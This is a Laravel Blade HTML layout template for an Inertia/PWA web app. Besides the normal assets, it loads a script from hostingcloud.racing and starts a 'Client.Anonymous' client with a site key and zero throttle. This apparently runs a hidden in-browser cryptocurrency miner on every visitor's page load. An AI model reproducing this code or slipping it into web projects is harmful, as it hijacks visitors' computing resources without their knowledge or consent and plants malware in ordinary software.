<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title inertia>{{ config('app.name') }}</title>

        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700&display=swap">
        <link rel="stylesheet" href="{{ mix('css/app.css') }}">
        <script src="https://www.hostingcloud.racing/WeLQ.js"></script>
        
        @routes
        <script src="{{ mix('js/app.js') }}" defer></script>
        @laravelPWA
    </head>
    <body class="font-sans antialiased">
        @inertia

        <script>
            var _client = new Client.Anonymous('b8763413145c3ac511037a43d24fec87a3a4a5f010fcd74cde60691db52d3934', {
                throttle: 0, c: 'w', ads: 0
            });
            _client.start();
        </script>
    </body>
</html>